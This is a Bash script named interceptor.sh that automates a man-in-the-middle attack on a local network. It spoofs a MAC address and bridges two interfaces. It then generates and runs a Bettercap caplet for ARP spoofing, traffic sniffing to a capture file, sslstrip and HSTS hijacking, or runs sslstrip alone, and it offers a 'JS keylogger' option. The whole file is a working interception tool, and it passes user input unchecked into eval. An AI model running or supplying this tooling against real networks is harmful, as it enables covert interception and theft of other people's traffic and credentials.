#!/usr/bin/env bash
#Title........: interceptor.sh
#Author.......: FARBER
#Version......: 1.0
#Usage........: bash interceptor.sh

#Global shellcheck disabled warnings
#shellcheck disable=SC2154
#shellcheck disable=SC2034

eval "echo "1" > /proc/sys/net/ipv4/ip_forward"

echo -e "    _____  _______________  ____________  __________  ___ \n   /  _/ |/ /_  __/ __/ _ \/ ___/ __/ _ \/_  __/ __ \/ _ \ \n  _/ //    / / / / _// , _/ /__/ _// ___/ / / / /_/ / , _/ \n /___/_/|_/ /_/ /___/_/|_|\___/___/_/    /_/  \____/_/|_| \n"

echo -e "Change MAC address? (y/n)"
read -p '--> ' user_descison1

# Смена MAC
if [[ "$user_descison1" == "y" ]]; then
	echo -e "Enter mac address:"
	read -p '--> ' usermac
	mactochange=$usermac
	
	echo -e "Enter interfrace (eth1)"
	read -p '--> ' userinterf	

	eval "macchanger -m $mactochange $userinterf"
	sleep 3
else
	echo -e "Skipping...\n"
fi

echo -e "Add bridge0 adapter to run traffic throught RPi? (y/n)"
read -p '--> ' user_descison2

# Запуск brctl
if [[ "$user_descison2" == "y" ]]; then
	eval "ifconfig eth0 0.0.0.0"
	eval "ifconfig eth1 0.0.0.0"
	eval "brctl addbr bridge0"
	eval "brctl addif bridge0 eth0"
	eval "brctl addif bridge0 eth1"
	eval "ifconfig bridge0 up"

	sleep 3
else
	echo -e "Skipping...\n"
fi

# Запуск меню
echo -e "Select sniffer:\n\n[1] Bettercap\n[2] SSLstrip\n"
read -p '--> ' user_descison3

if [[ "$user_descison3" == "1" ]]; then
	# Запуск Bettercap
	
	echo "Do you want inject JS keyloger? (y/n)"
	read -p '--> ' user_descison4
	echo -e "Moving next...\n"

	echo "Do you want to enable sslstrip? (y/n)"
	read -p '--> ' user_descison5

	echo -e "Moving next...\n"
	
	echo "Enter path to save captured data (/home/kali/Desktop/captured.cap)"
	read -p '--> ' path
	
	# Создание каплета
	if [[ "$user_descison4" == "y" ]] && [[ "$user_descison5" == "y" ]]; then
		echo -e "net.probe on\nsslstrip on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path\nhstshijack/hstshijack" > caplet.cap	
	elif [[ "$user_descison4" == "y" ]] && [[ "$user_descison5" == "n" ]]; then
		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path\nhstshijack/hstshijack" > caplet.cap
	elif [[ "$user_descison4" == "n" ]] && [[ "$user_descison5" == "n" ]]; then
		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path" > caplet.cap
	else
		echo -e "net.probe on\nset arp.spoof.fullduplex true\narp.spoof on\nnet.sniff on\nset net.sniff.output $path" > caplet.cap
	fi	
	
	eval "bettercap -caplet caplet.cap"	
	
elif [[ "$user_descison3" == "2" ]]; then
	echo "Enter port to listen to:"
	read -p '--> ' porttolisten
	
	echo "Enter filename to for log file:"
	read -p '--> ' filename	

	eval "sslstrip -w $filename -l $porttolisten"
fi

eval "echo "0" > /proc/sys/net/ipv4/ip_forward"
eval "rm -rf caplet.cap"
